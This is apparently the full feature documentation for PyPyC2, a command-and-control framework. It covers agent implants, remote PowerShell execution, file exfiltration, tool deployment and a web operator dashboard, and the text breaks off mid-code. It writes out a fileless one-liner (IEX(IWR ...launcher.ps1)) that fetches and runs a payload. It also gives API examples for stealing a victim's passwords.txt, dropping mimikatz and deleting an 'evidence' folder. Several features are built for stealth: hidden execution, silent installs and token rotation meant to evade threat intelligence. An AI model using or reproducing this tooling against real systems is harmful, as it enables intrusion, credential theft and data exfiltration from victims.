# PyPyC2 - Complete Features Documentation

## Table of Contents
1. [Overview & Architecture](#overview--architecture)
2. [Installation & Setup](#installation--setup)
3. [Core Features](#core-features)
4. [Agent Deployment](#agent-deployment)
5. [Web Dashboard](#web-dashboard)
6. [API Reference](#api-reference)
7. [Technical Implementation](#technical-implementation)
8. [Security Analysis](#security-analysis)

---

## Overview & Architecture

### What is PyPyC2?

PyPyC2 is a **Command and Control (C2) framework** designed for security research, red team training, and understanding offensive security mechanics. It provides a web-based interface to manage remote agents, execute commands, transfer files, and monitor compromised systems.

### Technology Stack

- **Backend**: Python 3.x with FastAPI framework
- **Frontend**: Next.js 14 (React) with TypeScript and Tailwind CSS
- **Agent**: Python-based implant with minimal dependencies
- **Storage**: In-memory (no database) + filesystem for files
- **Communication**: HTTP/REST API (polling-based)

### Architecture Overview

```
┌─────────────────┐
│  Web Dashboard  │ (Next.js + React)
│  (Operator UI)  │
└────────┬────────┘
         │ HTTPS (Protected by Bearer Token)
         │
┌────────▼────────┐
│  FastAPI Server │ (Python)
│   - Agent Mgmt  │
│   - Commands    │
│   - Files       │
└────────┬────────┘
         │ HTTP (No Authentication!)
         │
┌────────▼────────┐
│  Python Agents  │ (Deployed on targets)
│  - Poll Server  │
│  - Execute Cmds │
│  - Send Results │
└─────────────────┘
```

### Project Structure

```
pypyc2/
├── Server/                    # Backend API
│   ├── main.py               # FastAPI application entry point
│   ├── config.py             # Global configuration & agent storage
│   ├── models.py             # Pydantic data models
│   ├── dependencies.py       # Authentication dependency
│   ├── core/                 # Core functionality
│   │   ├── agent.py          # Agent class definition
│   │   ├── security.py       # Auth & session management
│   │   └── token_manager.py  # Payload token rotation
│   ├── routers/              # API endpoints
│   │   ├── auth.py           # Login/logout
│   │   ├── agents.py         # Agent management
│   │   ├── commands.py       # Command creation
│   │   ├── agent_comms.py    # Agent communication
│   │   ├── files.py          # File operations
│   │   └── payloads.py       # Payload generation
│   └── files/                # Static files
│       └── launcher.ps1      # PowerShell dropper
│
├── Agent/                     # Agent implants
│   ├── main.py               # Standard agent (uses requests)
│   └── allinone.py           # Standalone (no dependencies)
│
└── frontend/                  # Web UI
    └── src/
        ├── app/              # Next.js pages (App Router)
        ├── components/       # React components
        ├── contexts/         # Auth context
        ├── lib/             # API client & utilities
        └── types/           # TypeScript definitions
```

---

## Installation & Setup

### Server Setup

1. **Install Dependencies**:
```bash
cd Server
pip install -r requirements.txt
```

Required packages:
- `fastapi` - Web framework
- `uvicorn` - ASGI server
- `bcrypt` - Password hashing
- `python-multipart` - File upload support

2. **Start the Server**:
```bash
python main.py
```

Server runs on `http://0.0.0.0:8000` by default.

### Frontend Setup

1. **Install Dependencies**:
```bash
cd frontend
npm install
```

2. **Configure API URL**:
Edit `frontend/src/lib/api.ts` and set:
```typescript
const API_URL = 'http://localhost:8000'
```

3. **Start Development Server**:
```bash
npm run dev
```

Frontend accessible at `http://localhost:3000`

4. **Build for Production**:
```bash
npm run build
npm start
```

### Default Credentials

- **Username**: `admin`
- **Password**: `pypyc2admin`

---

## Core Features

### 1. Agent Management System

#### Agent Registration

**How it works**:
1. Agent sends POST request to `/join` with hostname and username
2. Server generates random 6-digit ID (100000-999999)
3. Server creates Agent object and stores in memory
4. Server returns agent ID to implant
5. Agent begins polling loop

**Registration Request**:
```json
POST /join
{
  "hostname": "DESKTOP-ABC123",
  "user": "john.doe"
}
```

**Server Response**:
```json
{
  "id": 482751,
  "status": true
}
```

#### Agent Data Model

Each agent stores:
- **id**: 6-digit unique identifier
- **ipaddr**: Client IP address (from HTTP request)
- **hostname**: Computer name
- **user**: Username running the agent
- **commands**: Dictionary of all commands (pending, running, completed)
- **command_counter**: Auto-incrementing command ID
- **uploaded_files**: List of files sent from agent to server
- **downloaded_files**: List of files sent from server to agent
- **last_seen**: ISO 8601 timestamp (updated on every poll)
- **joined_at**: Registration timestamp
- **sleep_time**: Polling interval in seconds (default: 3)

#### Status Tracking

**Online/Offline Detection**:
```typescript
function getAgentStatus(lastSeen: string, sleepTime: number) {
    const diffSeconds = (now - lastSeen) / 1000
    const threshold = sleepTime * 2 + 5  // 2x sleep + 5s buffer
    return diffSeconds < threshold ? 'online' : 'offline'
}
```

**Example**:
- Sleep time = 3s → Threshold = 11s
- If agent hasn't polled in 11+ seconds → Status: Offline

#### Agent Deletion

**Process**:
1. Check if agent is online (last_seen < 15 seconds ago)
2. If online:
   - Create `terminate` command
   - Wait 3 seconds for agent to process
3. Remove agent from memory
4. Delete agent's `uploads/agent_{id}/` directory
5. Return success status

**API Call**:
```
DELETE /agent/{agent_id}
```

---

### 2. Command Execution System

#### Command Types

PyPyC2 supports **9 command types**:

##### 2.1 **exec** - Execute Shell Commands

**Purpose**: Run PowerShell commands on the target system

**Request**:
```json
POST /command/{agent_id}/exec
{
  "command": "whoami /all"
}
```

**How it works**:
1. Server stores command in agent's queue with status `pending`
2. Agent polls and retrieves command (status → `retrieved`)
3. Agent executes via PowerShell:
   ```powershell
   powershell.exe -NoProfile -Command "<command>"
   ```
4. Agent captures stdout/stderr
5. Agent sends result back (status → `completed` or `failed`)

**Special Feature - Persistent Directory**:
- Agent maintains `CWD` (current working directory) variable
- `cd` commands update CWD instead of executing
- All subsequent commands run in the correct directory

**Example**:
```powershell
# Command 1
cd C:\Users

# Command 2 (runs in C:\Users, not original directory)
dir
```

##### 2.2 **upload** - Agent → Server File Transfer

**Purpose**: Exfiltrate files from target to C2 server

**Request**:
```json
POST /command/{agent_id}/upload
{
  "source_path": "C:\\Users\\victim\\Documents\\passwords.txt",
  "filename": "passwords.txt"
}
```

**Flow**:
1. Agent reads file from `source_path`
2. Agent sends multipart/form-data POST to `/agent/upload_file`
3. Server saves to `uploads/agent_{id}/{filename}`
4. Server records in agent's `uploaded_files` list
5. File available for download via dashboard

**Size Limit**: 100MB (configurable via `MAX_FILE_SIZE`)

##### 2.3 **download** - Server → Agent File Transfer

**Purpose**: Deploy files, tools, or scripts to target

**Request**:
```json
POST /command/{agent_id}/download
{
  "filename": "mimikatz.exe",
  "url": "http://192.168.1.100:8000/files/agent_123456/mimikatz.exe",
  "save_as": "C:\\temp\\debug.exe"
}
```

**Flow**:
1. Admin uploads file via `/upload_for_agent/{agent_id}`
2. Server stores in `uploads/agent_{id}/{filename}`
3. Server creates download command with file URL
4. Agent downloads from URL
5. Agent saves to `save_as` path
6. Server records in agent's `downloaded_files` list

##### 2.4 **list_directory** - Remote Directory Listing

**Purpose**: Browse filesystem on target machine

**Request**:
```json
POST /command/{agent_id}/list_directory
{
  "path": "C:\\Users\\victim"
}
```

**Response**:
```json
{
  "status": "success",
  "items": [
    {
      "name": "Documents",
      "is_directory": true,
      "size": 0,
      "path": "C:\\Users\\victim\\Documents"
    },
    {
      "name": "passwords.txt",
      "is_directory": false,
      "size": 4096,
      "path": "C:\\Users\\victim\\passwords.txt"
    }
  ]
}
```

**Features**:
- Sorted: directories first, then files (alphabetical)
- Includes file sizes in bytes
- Full path for each item
- Handles permission errors gracefully

##### 2.5 **read_file** - Read Remote File Content

**Purpose**: View/edit file contents in dashboard

**Request**:
```json
POST /command/{agent_id}/read_file
{
  "path": "C:\\scripts\\config.ini"
}
```

**Response**:
```json
{
  "status": "success",
  "content": "[Settings]\nUsername=admin\nPassword=secret123",
  "encoding": "utf-8"
}
```

**Features**:
- **Encoding Detection**: Tries utf-8, latin-1, cp1252, utf-16
- **Binary Detection**: Returns error for binary files
- **Size Limit**: 10MB maximum
- **Use Case**: Powers the Monaco editor in file manager

##### 2.6 **write_file** - Write Remote File Content

**Purpose**: Save edited file back to target

**Request**:
```json
POST /command/{agent_id}/write_file
{
  "path": "C:\\scripts\\config.ini",
  "content": "[Settings]\nUsername=admin\nPassword=new_password"
}
```

**Safety Features**:
- **Automatic Backup**: Creates `.bak` file before writing
- **Atomic Operation**: Writes to temp file first, then renames
- **Rollback**: Restores backup if write fails
- **Creates Parent Dirs**: Automatically creates missing directories

##### 2.7 **delete** - Delete Files/Directories

**Purpose**: Remove files or directories from target

**Request**:
```json
POST /command/{agent_id}/delete
{
  "path": "C:\\temp\\evidence",
  "recursive": true
}
```

**Parameters**:
- `path`: File or directory to delete
- `recursive`: If true, deletes directories and all contents

**Behavior**:
- Files: Immediate deletion
- Directories (recursive=false): Error if not empty
- Directories (recursive=true): Deletes everything inside

##### 2.8 **set_sleep_time** - Change Polling Interval

**Purpose**: Adjust agent's check-in frequency

**Request**:
```json
POST /command/{agent_id}/set_sleep_time
{
  "sleep_time": 10
}
```

**Range**: 1-60 seconds

**Trade-offs**:
- **Lower (1-5s)**: Faster response, more network traffic, easier detection
- **Higher (30-60s)**: Slower response, stealthier, less bandwidth

**Effect**:
- Agent immediately updates its `SLEEP_TIME` variable
- Server updates agent object after receiving success result
- All future polls use new interval

##### 2.9 **terminate** - Graceful Agent Shutdown

**Purpose**: Cleanly exit agent process

**Request**:
```json
POST /command/{agent_id}/terminate
```

**Flow**:
1. Server creates terminate command
2. Agent retrieves and executes
3. Agent sends success result
4. Agent sets `should_terminate = True`
5. Agent breaks main loop and exits

**When Used**:
- Manual agent shutdown
- Before deleting agent from server
- Stopping agents for maintenance

---

#### Command Lifecycle

```
┌──────────┐
│ PENDING  │ ← Command created by admin
└────┬─────┘
     │
     │ Agent polls /agent/get_commands
     ▼
┌───────────┐
│ RETRIEVED │ ← Agent received command
└────┬──────┘
     │
     │ Agent executes and sends result
     ▼
┌───────────┐     ┌────────┐
│ COMPLETED │  OR │ FAILED │
└───────────┘     └────────┘
```

**Timestamps**:
- `created_at`: When admin created command
- `retrieved_at`: When agent first received command
- `completed_at`: When result was received

---

### 3. File Operations

#### Storage Structure

```
uploads/
├── agent_123456/
│   ├── passwords.txt        # Uploaded from agent
│   ├── screenshot.png       # Uploaded from agent
│   └── mimikatz.exe        # Uploaded by admin for agent
├── agent_789012/
│   └── data.zip
└── ...
```

#### Upload from Agent (Exfiltration)

**Endpoint**: `POST /agent/upload_file`

**Multipart Form Data**:
```
agent_id: 123456
filename: passwords.txt
file: <binary data>
```

**Process**:
1. Admin creates `upload` command with source path
2. Agent reads file from disk
3. Agent sends multipart/form-data POST
4. Server validates:
   - Agent exists
   - Filename is safe (no path traversal)
   - Size ≤ 100MB
5. Server saves to `uploads/agent_{id}/{filename}`
6. Server updates agent's `uploaded_files` list

**Security**:
- Path traversal prevention: `Path(filename).name`
- Agent isolation: Separate directories per agent

#### Download to Agent (Deployment)

**Endpoint**: `GET /files/agent_{id}/{filename}`

**Process**:
1. Admin uploads file via dashboard (`/upload_for_agent/{agent_id}`)
2. Server stores in agent's directory
3. Admin creates `download` command with:
   - `filename`: Name in agent's directory
   - `url`: Full URL to file (e.g., `http://c2.local:8000/files/agent_123456/tool.exe`)
   - `save_as`: Where agent should save it
4. Agent downloads from URL
5. Agent saves to target path

**No Authentication**: `/files/` endpoint is public (agents can't auth)

#### Dashboard File Operations

**Download from Server** (`GET /dashboard/files/{agent_id}/{filename}`):
- Operator downloads exfiltrated files to their PC
- Protected by Bearer token

**Delete from Server** (`DELETE /dashboard/files/{agent_id}/{filename}`):
- Remove files from server storage
- Protected by Bearer token

**List Agent Files** (`GET /files/{agent_id}`):
- Returns JSON array of files in agent's directory
- Includes filename and size

---

### 4. Communication Protocol

#### Transport

- **Protocol**: HTTP (not HTTPS!)
- **Format**: JSON
- **Method**: RESTful API
- **Pattern**: Polling (agent initiates, no server push)

#### Agent → Server Endpoints

| Endpoint | Method | Purpose | Auth |
|----------|--------|---------|------|
| `/join` | POST | Register new agent | None |
| `/agent/get_commands/{id}` | GET | Poll for commands | None |
| `/agent/set_command_result` | POST | Submit command result | None |
| `/agent/upload_file` | POST | Upload file to server | None |
| `/files/agent_{id}/{filename}` | GET | Download file | None |

#### Operator → Server Endpoints

| Endpoint | Method | Purpose | Auth |
|----------|--------|---------|------|
| `/auth/login` | POST | Get bearer token | Credentials |
| `/agents` | GET | List all agents | Bearer |
| `/agent/{id}` | GET | Get agent details | Bearer |
| `/agent/{id}` | DELETE | Delete agent | Bearer |
| `/command/{id}/{type}` | POST | Create command | Bearer |
| `/upload_for_agent/{id}` | POST | Upload file for agent | Bearer |
| `/dashboard/files/{id}/{filename}` | GET | Download file | Bearer |
| `/api/payload-token` | GET | Get current token | Bearer |
| `/payload/launcher.ps1?id={token}` | GET | Get launcher | Token |

#### Message Formats

**Join Request**:
```json
POST /join
{
  "hostname": "WORKSTATION-01",
  "user": "john.doe"
}
```

**Join Response**:
```json
{
  "id": 482751,
  "status": true
}
```

**Get Commands Response**:
```json
{
  "commands": [
    {
      "command_id": 1,
      "type": "exec",
      "data": {
        "command": "whoami"
      }
    },
    {
      "command_id": 2,
      "type": "download",
      "data": {
        "filename": "tool.exe",
        "url": "http://192.168.1.100:8000/files/agent_482751/tool.exe",
        "save_as": "C:\\temp\\tool.exe"
      }
    }
  ]
}
```

**Set Command Result Request**:
```json
POST /agent/set_command_result
{
  "agent_id": 482751,
  "command_id": 1,
  "status": "success",
  "result": "desktop-abc123\\john.doe",
  "error": ""
}
```

#### Polling Mechanism

**Agent Loop**:
```python
while not should_terminate:
    time.sleep(SLEEP_TIME)  # Default: 3 seconds

    # Poll for commands
    response = requests.get(f"{SERVER_URL}/agent/get_commands/{AGENT_ID}")
    commands = response.json()['commands']

    # Execute each command
    for command in commands:
        result = execute_command(command)

        # Send result
        requests.post(f"{SERVER_URL}/agent/set_command_result", json={
            "agent_id": AGENT_ID,
            "command_id": command['command_id'],
            "status": result['status'],
            "result": result.get('result', ''),
            "error": result.get('error', '')
        })
```

**Timing**:
- Default sleep: 3 seconds
- Configurable: 1-60 seconds
- No jitter (predictable timing - detection risk!)

---

## Agent Deployment

### Method 1: PowerShell Launcher (Recommended)

**File**: `Server/files/launcher.ps1`

**Features**:
1. **Auto-installs Python** if not present:
   - Downloads Python 3.12.7 (64-bit) from python.org
   - Silent install (no user interaction)
   - User-level install (no admin required)
   - Minimal installation (~50MB)
   - Adds to PATH automatically

2. **Installs Dependencies**:
   - Runs `pip install requests --quiet`

3. **In-Memory Execution**:
   - Downloads agent code from server
   - Pipes directly to Python (no disk writes!)
   - Command: `python - http://c2-server:8000`

4. **Hidden Execution** (deployment mode):
   - Creates background process
   - No visible window
   - Continues after launcher exits

**Usage**:
1. Go to **Payloads** page in dashboard
2. Set server address (e.g., `192.168.1.100:8000`)
3. Select mode:
   - **Debug**: Visible PowerShell window
   - **Deployment**: Hidden background process
4. Copy generated one-liner
5. Execute on target machine

**Generated Payload Example**:
```powershell
IEX(IWR -UseBasicParsing http://192.168.1.100:8000/payload/launcher.ps1?id=7h9K2mP5nQ8xR1wV).Content
```

**Token Protection**:
- Launcher endpoint requires rotating token (5min expiry)
- Prevents threat intel from easily downloading payloads
- Token auto-rotates every 5 minutes

### Method 2: Manual Deployment

**Standard Agent** (requires `requests` library):
```bash
# On target machine
pip install requests
python Agent/main.py http://c2-server:8000
```

**All-in-One Agent** (no dependencies):
```bash
# On target machine
python Agent/allinone.py http://c2-server:8000
```

**Difference**:
- `main.py`: Uses `requests` library (cleaner code)
- `allinone.py`: Pure stdlib `urllib` (no dependencies, longer code)

---

## Web Dashboard

### 1. Login Page (`/login`)

**Features**:
- Username/password form
- "Remember me" checkbox (saves to localStorage)
- Auto-redirect if already authenticated

**Default Credentials**:
- Username: `admin`
- Password: `pypyc2admin`

**Flow**:
1. Submit credentials
2. Server validates (bcrypt hash check)
3. Server creates session with UUID token
4. Token stored in localStorage
5. Redirect to dashboard

---

### 2. Dashboard (`/`)

**Overview Stats** (4 cards):
- Total Agents (all time)
- Online Agents (active in last 15s)
- Total Commands (across all agents)
- Files Uploaded (exfiltrated files)

**Network Topology**:
- Visual graph of C2 infrastructure
- Central server node
- Agent nodes connected with lines
- Color-coded status:
  - Green = Online
  - Red = Offline
- Click agent to view details
- Refresh button

**Auto-refresh**: Every 3 seconds

---

### 3. Agents List (`/agents`)

**Features**:
- Grid of agent cards
- Filter by status:
  - All Agents
  - Online (green indicator)
  - Offline (red indicator)
- Each card shows:
  - Hostname
  - Username
  - IP address
  - Status indicator (pulsing dot)
  - Last seen time
  - Total commands count
- Actions per agent:
  - **View Details** → Agent detail page
  - **Open Terminal** → Terminal with agent pre-selected

**Auto-refresh**: Every 3 seconds

---

### 4. Agent Details (`/agents/{id}`)

**Three Tabs**:

#### Overview Tab
- Agent ID, hostname, user, IP
- Status indicator (online/offline)
- Joined timestamp
- Current sleep time
- Statistics:
  - Total commands
  - Completed commands
  - Failed commands
  - Pending commands
  - Files uploaded
  - Files downloaded

#### Commands Tab
- Filter by status dropdown (all/completed/failed/pending)
- Collapsible command list
- Each command shows:
  - Command type badge
  - Command details (e.g., exec command text)
  - Timestamps (created, retrieved, completed)
  - Status badge (pending/retrieved/completed/failed)
  - Output (collapsible, with copy button)
- Copy buttons for both command and output

#### Files Tab
- **Uploaded Files** (from agent):
  - Filename
  - Size
  - Upload timestamp
  - Download button (downloads to operator's PC)
- **Downloaded Files** (sent to agent):
  - Filename
  - Download timestamp

**Toolbar Actions**:
- **Refresh**: Manual refresh
- **Open Terminal**: Open terminal for this agent
- **Manage Files**: Open file manager
- **Change Sleep Time**: Modal to set new polling interval (1-60s)
- **Delete Agent**:
  - Confirmation modal
  - Sends terminate command if online
  - Waits 3 seconds
  - Deletes agent and all files

**Auto-refresh**: Every 5 seconds

---

### 5. Terminal (`/terminal`)

**Layout**:
- Left sidebar: Agent selector (shows all agents)
- Main area: Terminal interface

**Features**:
- **Agent Selection**: Click agent in sidebar to connect
- **Command Input**: Text box at bottom
- **Execute**: Press Enter or click Execute button
- **Output Display**:
  - Virtualized scrolling (react-virtuoso) for performance
  - Shows all commands and their outputs
  - Color-coded status (success/error)
  - Loading indicator while waiting for result
- **Real-time Updates**: Polls every 300ms for command results
- **Timeout Calculation**: `(agent_sleep_time * 3) + 10` seconds
- **Status Indicator**: Shows if selected agent is online/offline

**Smart Polling**:
- Frontend polls `/command/{agent_id}/{command_id}` endpoint
- Calculates max attempts based on agent's sleep time
- Shows loading spinner while waiting
- Displays result when available
- Shows error if timeout reached

**Example Session**:
```
> whoami
desktop-abc123\john.doe

> cd C:\Users
Changed directory to C:\Users

> dir
Directory: C:\Users
Mode    LastWriteTime    Length Name
----    -------------    ------ ----
d-----  1/1/2025 10:00 AM       john.doe
d-----  1/1/2025 09:00 AM       Public
```

---

### 6. File Manager (`/filemanager`)

**Most Advanced Feature** - Full remote filesystem browser.

**Layout**:
- Top: Agent selector dropdown
- Toolbar: Refresh, Upload, Download buttons
- Breadcrumb navigation (clickable path)
- File/folder table with sortable columns
- Selected files panel (for bulk operations)
- Monaco editor modal (for file editing)

**Features**:

#### Directory Browsing
- List files and folders
- Sort by name, size, or type
- Double-click folder to navigate
- Breadcrumb navigation (e.g., `C:\ > Users > john.doe > Documents`)
- Shows file sizes (formatted: KB, MB, GB)
- File/folder icons

#### Multi-Select Operations
- Checkbox for each file/folder
- Select multiple items
- Bulk download (downloads to server)
- Selected count in panel

#### File Upload
- Upload files from operator's PC to server
- Then deploy to agent's current directory
- Uses standard file picker

#### File Download (to server)
- Select files/folders
- Click Download button
- Files transferred from agent to server
- Available in Downloads page

#### File Editing
- Click "Edit" on any file
- Opens Monaco editor (VSCode editor)
- Syntax highlighting for 20+ languages:
  - Python, JavaScript, TypeScript, HTML, CSS
  - JSON, YAML, XML, Markdown
  - PowerShell, Bash, C, C++, Java
  - And more...
- Features:
  - Line numbers
  - Code folding
  - Find/replace
  - Minimap
  - Auto-completion
- **Save** button writes changes back to target
- **Creates backup** before saving (`.bak` file)
- Binary file detection (shows error)
- Modified indicator (shows if unsaved changes)

#### File Deletion
- Select files/folders
- Click Delete button
- Confirmation modal
- For directories: Option for recursive delete

#### Persistence
- Uses **localStorage** to remember:
  - Last selected agent
  - Current directory per agent
- Restores state on page reload

**Technical Details**:
- Async operations with loading states
- Error handling with toast notifications
- Smart polling for command results
- 10MB file size limit for editing
- Encoding detection (utf-8, latin-1, cp1252, utf-16)

---

### 7. Downloads (`/files`)

**Purpose**: Access files uploaded from agents (exfiltrated data)

**Features**:
- Lists all files in server's `uploads/` directory
- Organized by agent
- Each file shows:
  - Filename
  - Size (formatted)
  - Upload timestamp
- Actions:
  - **Download**: Download to operator's PC
  - **Delete**: Remove from server storage (with confirmation)
- Search/filter by filename
- Sort by name, size, or date

---

### 8. Payloads (`/payloads`)

**Purpose**: Generate deployment commands for new agents

**Configuration Section**:
- **Server Address**: IP or domain (e.g., `192.168.1.100`)
- **Server Port**: Default `8000`
- **Mode**:
  - **Debug**: Visible PowerShell window (for testing)
  - **Deployment**: Hidden background process (for operations)

**Token Protection**:
- Displays current token expiry countdown
- Token rotates every 5 minutes
- Prevents threat intel from downloading payloads

**Generated Payload**:
Shows PowerShell one-liner:
```powershell
IEX(IWR -UseBasicParsing http://192.168.1.100:8000/payload/launcher.ps1?id=7h9K2mP5nQ8xR1wV).Content
```

**Copy to Clipboard** button for easy deployment

**Instructions Section**:
- Step-by-step deployment guide
- Explains what the launcher does
- Security considerations

---

## API Reference

### Authentication Endpoints

#### Login
```
POST /auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "pypyc2admin"
}

Response 200:
{
  "token": "550e8400-e29b-41d4-a716-446655440000",
  "username": "admin",
  "role": "admin"
}

Response 401:
{
  "detail": "Invalid credentials"
}
```

#### Logout
```
POST /auth/logout
Authorization: Bearer <token>

Response 200:
{
  "message": "Logged out successfully"
}
```

#### Verify Token
```
GET /auth/verify
Authorization: Bearer <token>

Response 200:
{
  "username": "admin",
  "role": "admin"
}

Response 401:
{
  "detail": "Invalid or expired session"
}
```

---

### Agent Management Endpoints

#### List All Agents
```
GET /agents
Authorization: Bearer <token>

Response 200:
[
  {
    "id": 482751,
    "ipaddr": "192.168.1.50",
    "hostname": "WORKSTATION-01",
    "user": "john.doe",
    "last_seen": "2025-11-22T10:30:45Z",
    "joined_at": "2025-11-22T09:15:20Z",
    "sleep_time": 3
  }
]
```

#### Get Agent Details
```
GET /agent/{agent_id}
Authorization: Bearer <token>

Response 200:
{
  "id": 482751,
  "ipaddr": "192.168.1.50",
  "hostname": "WORKSTATION-01",
  "user": "john.doe",
  "last_seen": "2025-11-22T10:30:45Z",
  "joined_at": "2025-11-22T09:15:20Z",
  "sleep_time": 3,
  "commands": {
    "1": {
      "type": "exec",
      "data": {"command": "whoami"},
      "status": "completed",
      "result": "workstation-01\\john.doe",
      "created_at": "2025-11-22T10:20:00Z",
      "retrieved_at": "2025-11-22T10:20:03Z",
      "completed_at": "2025-11-22T10:20:05Z"
    }
  },
  "uploaded_files": ["passwords.txt"],
  "downloaded_files": ["tool.exe"]
}
```

#### Delete Agent
```
DELETE /agent/{agent_id}
Authorization: Bearer <token>

Response 200:
{
  "message": "Agent deleted",
  "terminated": true
}
```

---

### Command Creation Endpoints

#### Execute Command
```
POST /command/{agent_id}/exec
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "whoami /all"
}

Response 200:
{
  "command_id": 5,
  "message": "Command created"
}
```

#### Upload File (Agent → Server)
```
POST /command/{agent_id}/upload
Authorization: Bearer <token>

{
  "source_path": "C:\\Users\\victim\\passwords.txt",
  "filename": "passwords.txt"
}

Response 200:
{
  "command_id": 6,
  "message": "Upload command created"
}
```

#### Download File (Server → Agent)
```
POST /command/{agent_id}/download
Authorization: Bearer <token>

{
  "filename": "tool.exe",
  "url": "http://192.168.1.100:8000/files/agent_482751/tool.exe",
  "save_as": "C:\\temp\\tool.exe"
}

Response 200:
{
  "command_id": 7,
  "message": "Download command created"
}
```

#### List Directory
```
POST /command/{agent_id}/list_directory
Authorization: Bearer <token>

{
  "path": "C:\\Users"
}

Response 200:
{
  "command_id": 8,
  "message": "List directory command created"
}
```

#### Read File
```
POST /command/{agent_id}/read_file
Authorization: Bearer <token>

{
  "path": "C:\\config.ini"
}

Response 200:
{
  "command_id": 9,
  "message": "Read file command created"
}
```

#### Write File
```
POST /command/{agent_id}/write_file
Authorization: Bearer <token>

{
  "path": "C:\\config.ini",
  "content": "[Settings]\nKey=Value"
}

Response 200:
{
  "command_id": 10,
  "message": "Write file command created"
}
```

#### Delete File/Directory
```
POST /command/{agent_id}/delete
Authorization: Bearer <token>

{
  "path": "C:\\temp\\evidence",
  "recursive": true
}

Response 200:
{
  "command_id": 11,
  "message": "Delete command created"
}
```

#### Set Sleep Time
```
POST /command/{agent_id}/set_sleep_time
Authorization: Bearer <token>

{
  "sleep_time": 10
}

Response 200:
{
  "command_id": 12,
  "message": "Set sleep time command created"
}
```

#### Terminate Agent
```
POST /command/{agent_id}/terminate
Authorization: Bearer <token>

Response 200:
{
  "command_id": 13,
  "message": "Terminate command created"
}
```

#### Get Command Result
```
GET /command/{agent_id}/{command_id}
Authorization: Bearer <token>

Response 200 (completed):
{
  "status": "completed",
  "result": "Output here...",
  "error": ""
}

Response 200 (pending):
{
  "status": "pending",
  "result": null,
  "error": null
}

Response 404:
{
  "detail": "Command not found"
}
```

---

### Agent Communication Endpoints (No Auth)

#### Join
```
POST /join

{
  "hostname": "WORKSTATION-01",
  "user": "john.doe"
}

Response 200:
{
  "id": 482751,
  "status": true
}
```

#### Get Commands
```
GET /agent/get_commands/{agent_id}

Response 200:
{
  "commands": [
    {
      "command_id": 1,
      "type": "exec",
      "data": {"command": "whoami"}
    }
  ]
}
```

#### Set Command Result
```
POST /agent/set_command_result

{
  "agent_id": 482751,
  "command_id": 1,
  "status": "success",
  "result": "Output here",
  "error": ""
}

Response 200:
{
  "message": "Result received"
}
```

#### Upload File
```
POST /agent/upload_file
Content-Type: multipart/form-data

agent_id: 482751
filename: passwords.txt
file: <binary>

Response 200:
{
  "message": "File uploaded successfully",
  "filename": "passwords.txt"
}
```

---

### File Management Endpoints

#### Download File (Agent)
```
GET /files/agent_{agent_id}/{filename}

Response 200:
<binary file data>
```

#### List Agent Files
```
GET /files/{agent_id}
Authorization: Bearer <token>

Response 200:
[
  {
    "filename": "passwords.txt",
    "size": 4096
  }
]
```

#### Download File (Dashboard)
```
GET /dashboard/files/{agent_id}/{filename}
Authorization: Bearer <token>

Response 200:
<binary file data>
```

#### Upload File for Agent
```
POST /upload_for_agent/{agent_id}
Authorization: Bearer <token>
Content-Type: multipart/form-data

file: <binary>

Response 200:
{
  "message": "File uploaded successfully",
  "filename": "tool.exe"
}
```

#### Delete File
```
DELETE /dashboard/files/{agent_id}/{filename}
Authorization: Bearer <token>

Response 200:
{
  "message": "File deleted successfully"
}
```

---

### Payload Endpoints

#### Get Current Token
```
GET /api/payload-token
Authorization: Bearer <token>

Response 200:
{
  "token": "7h9K2mP5nQ8xR1wV",
  "expires_in": 243
}
```

#### Get Launcher Script
```
GET /payload/launcher.ps1?id={token}

Response 200:
<PowerShell script>

Response 404 (invalid token):
{
  "detail": "Invalid or expired payload token"
}
```

---

## Technical Implementation

### In-Memory Storage System

**No Database**: PyPyC2 uses in-memory dictionaries for all data.

**Global Storage** (`Server/config.py`):
```python
agents: Dict[int, Agent] = {}
```

**Sessions** (`Server/core/security.py`):
```python
sessions: Dict[str, SessionData] = {}
```

**Implications**:
- **Fast**: No database overhead
- **Volatile**: All data lost on server restart
- **Simple**: No migrations, schemas, or ORMs
- **Limited Scale**: All data must fit in RAM

---

### Data Models

#### Agent Class (`Server/core/agent.py`)
```python
class Agent:
    def __init__(self, id: int, ipaddr: str, hostname: str, user: str):
        self.id = id
        self.ipaddr = ipaddr
        self.hostname = hostname
        self.user = user
        self.commands: Dict[int, Dict] = {}
        self.command_counter = 0
        self.uploaded_files: List[str] = []
        self.downloaded_files: List[str] = []
        self.last_seen = datetime.now(timezone.utc).isoformat()
        self.joined_at = datetime.now(timezone.utc).isoformat()
        self.sleep_time = 3

    def update_last_seen(self):
        self.last_seen = datetime.now(timezone.utc).isoformat()

    def add_command(self, command_type: str, data: Dict) -> int:
        self.command_counter += 1
        self.commands[self.command_counter] = {
            'type': command_type,
            'data': data,
            'result': None,
            'status': 'pending',
            'created_at': datetime.now(timezone.utc).isoformat(),
            'retrieved_at': None,
            'completed_at': None
        }
        return self.command_counter

    def get_commands(self) -> List[Dict]:
        commands = []
        for cmd_id, cmd in self.commands.items():
            if cmd['status'] == 'pending':
                cmd['status'] = 'retrieved'
                cmd['retrieved_at'] = datetime.now(timezone.utc).isoformat()
                commands.append({
                    'command_id': cmd_id,
                    'type': cmd['type'],
                    'data': cmd['data']
                })
        return commands
```

#### Session Data
```python
class SessionData:
    username: str
    role: str
    created_at: datetime
    last_activity: datetime
```

---

### Authentication System

**Password Hashing** (`Server/core/security.py`):
```python
import bcrypt

# Hardcoded credentials
ADMIN_USER = "admin"
ADMIN_PASSWORD_HASH = bcrypt.hashpw(
    "pypyc2admin".encode('utf-8'),
    bcrypt.gensalt()
)

def verify_credentials(username: str, password: str) -> bool:
    if username != ADMIN_USER:
        return False
    return bcrypt.checkpw(password.encode('utf-8'), ADMIN_PASSWORD_HASH)
```

**Session Management**:
```python
import uuid
from datetime import datetime, timedelta, timezone

sessions: Dict[str, SessionData] = {}
SESSION_TIMEOUT = timedelta(hours=8)

def create_session(username: str, role: str) -> str:
    token = str(uuid.uuid4())
    sessions[token] = SessionData(
        username=username,
        role=role,
        created_at=datetime.now(timezone.utc),
        last_activity=datetime.now(timezone.utc)
    )
    return token

def validate_session(token: str) -> Optional[SessionData]:
    session = sessions.get(token)
    if not session:
        return None

    # Check timeout
    if datetime.now(timezone.utc) - session.last_activity > SESSION_TIMEOUT:
        del sessions[token]
        return None

    # Update last activity
    session.last_activity = datetime.now(timezone.utc)
    return session
```

---

### Token Rotation System

**Purpose**: Prevent automated payload scraping by threat intel

**Implementation** (`Server/core/token_manager.py`):
```python
import secrets
import threading
import time
